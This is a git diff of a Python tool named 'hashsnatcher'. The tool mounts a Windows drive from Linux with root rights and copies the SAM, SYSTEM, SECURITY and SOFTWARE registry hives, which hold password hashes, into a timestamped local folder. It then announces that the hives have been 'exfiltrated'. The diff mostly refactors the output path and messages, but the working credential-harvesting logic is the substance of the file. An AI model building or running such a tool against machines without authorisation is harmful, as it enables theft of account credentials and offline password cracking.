@@ -6,7 +6,7 @@
 
 #maybe import os?
 
-import sys, subprocess, argparse, time, shutil, os
+import sys, subprocess, argparse, time, shutil, os, datetime
 
 class Drive:
     def __init__(self):
@@ -51,11 +51,12 @@ def mount_drive(drive):
     #got rid of /etc/services fromm mount command. Don't think I need it
     try:
         os.mkdir('/media/windows')
+        print('/media/windows has been created for you, and will be used as a mounting point')
     except PermissionError:
         print('was unable to create mountpoint. Please run hashsnatcher as root.')
         sys.exit()
     except FileExistsError:
-        print('already have mounting point')
+        print('/media/windows exists, and will be used as a mounting point')
     subprocess.Popen("sudo mount -t ntfs-3g -o nls=utf8 {} /media/windows".format(drive.get_source()), shell=True)
     time.sleep(1)
 
@@ -63,36 +64,31 @@ def copy_winpayload():
     # gotta use the mount point made by mount_drive here from the user input
     # i should implement some code that suggests a drive to choose based off of mounting other ones and lsing
     # them. This will be slow but very cool
+    stamp = str(datetime.datetime.now().timestamp())
+    directory = f'{os.getcwd()}/hives_{stamp[:4]}'
+    os.mkdir(directory) 
 
-    #^^^ dumb idea probably. A good idea wouldl be to refactor this and get rid of the shit hardcoded values for copy dest!
-    dirss = os.listdir('/media/windows')
-    
-    for dirs in dirss:
-        if "Windows" in str(dirs):
-            print('targeting :)')
-    # shutil.copyfile('/media/windows/hyberfil.sys*', '/home/zigmo/Desktop/hyberfil.sys')
-    # time.sleep(10) 
     try:
-        shutil.copyfile('/media/windows/Windows/System32/config/sam', f'{os.getcwd()}/sam')
+        shutil.copyfile('/media/windows/Windows/System32/config/sam', f'{directory}/sam')
     except FileNotFoundError as e:
         print('sam not found')
 
     try:
-        shutil.copyfile('/media/windows/Windows/System32/config/system', f'{os.getcwd()}/system')
+        shutil.copyfile('/media/windows/Windows/System32/config/system', f'{directory}/system')
     except FileNotFoundError as e:
         print('system not found')
 
     try:
-        shutil.copyfile('/media/windows/Windows/System32/config/security', f'{os.getcwd()}/security')
+        shutil.copyfile('/media/windows/Windows/System32/config/security', f'{directory}/security')
     except FileNotFoundError as e:
         print('security not found')
     try:
-        shutil.copyfile('/media/windows/Windows/System32/config/software', f'{os.getcwd()}/software')
+        shutil.copyfile('/media/windows/Windows/System32/config/software', f'{directory}/software')
     except FileNotFoundError as e:
         print('software not found')
         
         # subprocess.Popen('sudo cp /media/windows/hyberfil.sys /home/galactic_t0ast/Desktop/hyberfil.sys', shell=True)
-    print('SYSTEM SAM SECURITY and SOFTWARE registry hives have been succesfully exfiltrated to your pwd')
+    print('registry hives have been succesfully exfiltrated to your pwd')
 
     #optimize this...
     time.sleep(1)
@@ -130,6 +126,7 @@ def list_n_target_windrives(drives):
             print("[Drive {}] {}\n".format(drive_count, drive))
             drive_count += 1
         target = input("\n========================================================\nplease choose a drive to exploit. Note drives start at 0\n\nDrive ")
+        print('*********************************************************************************************')
         print("Targeting: " + raw_win_drives[int(target)])
         mount_drive(win_drives[int(target)])
         return True
